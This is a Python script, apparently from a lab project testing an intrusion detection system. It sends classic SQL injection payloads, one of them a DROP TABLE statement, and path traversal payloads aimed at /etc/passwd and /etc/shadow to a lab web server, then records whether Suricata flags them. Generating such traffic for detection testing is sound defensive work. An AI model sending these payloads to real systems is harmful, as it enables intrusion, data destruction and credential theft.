#!/usr/bin/env python3
"""
web_attack.py - Basic web attack generator (SQLi + path traversal) for Project 3
(AI-Assisted IDS/IPS with DMZ)

Sends a series of HTTP requests containing classic SQL injection and path
traversal payloads against a target (default: DMZ-Web). The target here is a
static nginx instance with no backend database or dynamic scripting, so no
payload will actually "succeed" -- the goal is purely to generate the request
*patterns* that IDS signatures are built to recognize, and measure whether
Suricata flags them.

Usage:
    python3 web_attack.py [--target 172.16.30.10] [--outdir ./results]
"""

import argparse
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

try:
    import requests
except ImportError:
    print("ERROR: requests not installed. Run: pip install --break-system-packages requests", file=sys.stderr)
    sys.exit(1)


# Classic SQL injection payloads, sent as URL query parameters
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' AND '1'='1",
    "'; DROP TABLE users;--",
]

# Classic path traversal payloads
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/../../../../etc/shadow",
]


def send_sqli_requests(base_url: str) -> list:
    """Send SQLi payloads as a query parameter to a plausible endpoint."""
    results = []
    for payload in SQLI_PAYLOADS:
        url = f"{base_url}/index.html"
        params = {"id": payload}
        try:
            resp = requests.get(url, params=params, timeout=5)
            results.append({
                "attack_type": "sqli",
                "payload": payload,
                "url": resp.url,
                "status_code": resp.status_code,
                "response_length": len(resp.content),
                "error": None,
            })
        except requests.exceptions.RequestException as e:
            results.append({
                "attack_type": "sqli",
                "payload": payload,
                "url": url,
                "status_code": None,
                "response_length": None,
                "error": str(e),
            })
    return results


def send_traversal_requests(base_url: str) -> list:
    """Send path traversal payloads directly in the URL path."""
    results = []
    for payload in TRAVERSAL_PAYLOADS:
        url = f"{base_url}/{payload}"
        try:
            resp = requests.get(url, timeout=5)
            results.append({
                "attack_type": "path_traversal",
                "payload": payload,
                "url": resp.url,
                "status_code": resp.status_code,
                "response_length": len(resp.content),
                "error": None,
            })
        except requests.exceptions.RequestException as e:
            results.append({
                "attack_type": "path_traversal",
                "payload": payload,
                "url": url,
                "status_code": None,
                "response_length": None,
                "error": str(e),
            })
    return results


def main():
    parser = argparse.ArgumentParser(description="Basic web attack generator (SQLi + path traversal)")
    parser.add_argument("--target", default="172.16.30.10", help="Target IP (default: DMZ-Web)")
    parser.add_argument("--outdir", default="./results", help="Output directory for results")
    args = parser.parse_args()

    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)

    base_url = f"http://{args.target}"
    start_time = datetime.now(timezone.utc).isoformat()

    print(f"[+] Sending SQLi payloads to {base_url} ...")
    sqli_results = send_sqli_requests(base_url)

    print(f"[+] Sending path traversal payloads to {base_url} ...")
    traversal_results = send_traversal_requests(base_url)

    end_time = datetime.now(timezone.utc).isoformat()

    result = {
        "scan_type": "web_attack_sqli_traversal",
        "target": args.target,
        "start_time": start_time,
        "end_time": end_time,
        "sqli_requests": sqli_results,
        "traversal_requests": traversal_results,
        "total_requests": len(sqli_results) + len(traversal_results),
    }

    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    outfile = outdir / f"web_attack_{args.target}_{timestamp}.json"

    with open(outfile, "w") as f:
        json.dump(result, f, indent=2)

    print(f"[+] Attack complete. {result['total_requests']} requests sent.")
    print(f"[+] Results written to {outfile}")

    print("\nSummary:")
    for r in sqli_results + traversal_results:
        status = r["status_code"] if r["status_code"] is not None else f"ERROR: {r['error']}"
        print(f"  [{r['attack_type']:15s}] {r['payload'][:40]:40s} -> {status}")


if __name__ == "__main__":
    main()
